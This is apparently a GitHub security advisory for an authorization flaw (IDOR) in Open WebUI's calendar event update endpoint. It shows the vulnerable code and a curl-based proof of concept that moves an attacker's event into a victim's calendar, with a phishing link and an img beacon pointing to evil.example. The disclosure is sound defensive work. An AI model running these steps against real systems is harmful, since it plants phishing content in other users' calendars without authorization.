# [M] Open WebUI IDOR: Calendar event re-parenting allows writing events into another user's calendar

## Summary
Severity: Medium
Advisory: GHSA-f3g7-59qc-pqg6
CVE: CVE-2026-54006
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-f3g7-59qc-pqg6
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
### Summary

`POST /api/v1/calendars/events/{event_id}/update` validates that the caller has **write** access to the calendar the event *currently* belongs to, but does not validate the **destination** `calendar_id` supplied in the request body. The model layer then persists the new `calendar_id` unconditionally.

A regular `user`-role account can therefore create an event in their own calendar and immediately move it into any other user's calendar whose ID they know — bypassing the authorization check that `create_event` correctly performs. This is reachable on **default configuration**: `ENABLE_CALENDAR` and `USER_PERMISSIONS_FEATURES_CALENDAR` both default to `True`.


### Details
### Sink — missing destination check

`backend/open_webui/routers/calendar.py:283-297`

```python
@router.post('/events/{event_id}/update', response_model=CalendarEventModel)
async def update_event(
    request: Request, event_id: str, form_data: CalendarEventUpdateForm,
    user: UserModel = Depends(get_verified_user)
):
    await check_calendar_permission(request, user)
    event = await CalendarEvents.get_event_by_id(event_id)
    if not event:
        raise HTTPException(status_code=404, detail='Event not found')

    await _check_calendar_access(event.calendar_id, user, 'write')   # ← SOURCE only

    updated = await CalendarEvents.update_event_by_id(event_id, form_data)  # ← writes form_data.calendar_id
    ...
```

`backend/open_webui/models/calendar.py:658-693` (`update_event_by_id`)

```python
update_data = form_data.model_dump(exclude_unset=True)
for field in [
    'calendar_id',          # ← destination persisted with no ACL
    'title', 'description', 'start_at', 'end_at', 'all_day',
    'rrule', 'color', 'location', 'is_cancelled',
]:
    if field in update_data:
        setattr(event, field, update_data[field])
```

### Reference — `create_event` does check the destination

`backend/open_webui/routers/calendar.py:255`

```python
await _check_calendar_access(form_data.calendar_id, user, 'write')
```

### Default-config gates (both `True`)

- `backend/open_webui/config.py:1658-1662` — `ENABLE_CALENDAR` defaults `'True'`
- `backend/open_webui/config.py:1554` — `USER_PERMISSIONS_FEATURES_CALENDAR` defaults `'True'`
- `backend/open_webui/main.py:1457` — router mounted unconditionally


### PoC
Verified end-to-end against the official `ghcr.io/open-webui/open-webui:main` (v0.9.4) Docker image with two fresh `user`-role accounts.

#### 1. Environment

```bash
git clone https://github.com/open-webui/open-webui.git
cd open-webui && docker compose up -d        # http://localhost:3000
```

Create the first account (admin), then via admin UI / `POST /api/v1/auths/add` create two `user`-role accounts: **attacker** and **victim**. Sign each in and capture their JWTs as `$ATTACKER_TOKEN` / `$VICTIM_TOKEN`.

#### 2. Obtain the victim's `calendar_id`

Calendar IDs are UUIDv4 (`models/calendar.py:316`) and not enumerable. In practice an attacker obtains one via:

- **Read-only share** — victim (or a group admin) grants the attacker `read` on a calendar; the ID is returned by `GET /api/v1/calendars/`.
- **Event invitation** — victim adds the attacker as an attendee on any event; the event payload (`CalendarEventModel`, `models/calendar.py:127`) includes `calendar_id`.
- Any side-channel (logs, screenshots, browser history).

For reproduction the maintainer can simply read it as the victim:

```bash
VICTIM_CALENDAR_ID=$(curl -s "$OPENWEBUI/api/v1/calendars/" \
  -H "Authorization: Bearer $VICTIM_TOKEN" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')
```

#### 3. Control — direct create is correctly blocked

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST "$OPENWEBUI/api/v1/calendars/events/create" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" -H 'Content-Type: application/json' \
  -d "{\"calendar_id\":\"$VICTIM_CALENDAR_ID\",\"title\":\"x\",\"start_at\":1778400000000000000,\"end_at\":1778403600000000000}"
# → 403
```

#### 4. Exploit — create-then-reparent

```bash
ATTACKER_CAL=$(curl -s "$OPENWEBUI/api/v1/calendars/" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')

# 1. create in own calendar
EVENT_ID=$(curl -s -X POST "$OPENWEBUI/api/v1/calendars/events/create" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" -H 'Content-Type: application/json' \
  -d "{\"calendar_id\":\"$ATTACKER_CAL\",\"title\":\"[INJECTED] Mandatory re-auth: https://evil.example/login\",\"description\":\"Session expired.\",\"location\":\"<img src=https://evil.example/beacon.png>\",\"start_at\":1778400000000000000,\"end_at\":1778403600000000000}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')

# 2. move into victim's calendar — NO destination check
curl -s -X POST "$OPENWEBUI/api/v1/calendars/events/$EVENT_ID/update" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" -H 'Content-Type: application/json' \
  -d "{\"calendar_id\":\"$VICTIM_CALENDAR_ID\"}"
# → 200, response shows "calendar_id":"<VICTIM_CALENDAR_ID>"
```

#### 5. Verification from victim's session

```bash
curl -s "$OPENWEBUI/api/v1/calendars/events?start=2026-05-01T00:00:00&end=2026-06-01T00:00:00" \
  -H "Authorization: Bearer $VICTIM_TOKEN" | python3 -m json.tool
```

Observed output (truncated):

```json
[{
  "id": "1662c982-adb1-43d6-a9c8-0103fa1299c0",
  "calendar_id": "0b755ea7-4ff4-4a60-9cff-8961e69c75bb",
  "user_id": "7554dd33-e220-44cb-8441-169c55eef4f5",
  "title": "[INJECTED] Mandatory re-auth: https://evil.example/login",
  "description": "Session expired.",
  ...
}]
```

The injected event now lives in the victim's default calendar. A subsequent `GET /events/{id}` as the **attacker** returns **403** — confirming the move succeeded and the attacker has no legitimate access to the destination.


### Impact
- **Read-only → write escalation** on shared calendars: a user granted `read` via `AccessGrants` can effectively write.
- **Phishing / social engineering**: events appear inside the victim's own private calendar (not as an external invite). The hover tooltip (`CalendarEventChip.svelte:12 → common/Tooltip.svelte`) renders `title`/`location` as DOMPurify-sanitised HTML with `allowHTML=true`, so an attacker can embed formatted links and `<img>` beacons (read-receipt when the victim hovers). DOMPurify prevents script execution, so this is HTML injection, not XSS.
- **Calendar spam / DoS**: unlimited one-shot injections (attacker loses access to each event after the move, but can repeat with new events).

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-f3g7-59qc-pqg6
- https://nvd.nist.gov/vuln/detail/CVE-2026-54006
- https://github.com/advisories/GHSA-f3g7-59qc-pqg6
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2722.yaml
- https://pypi.org/project/open-webui
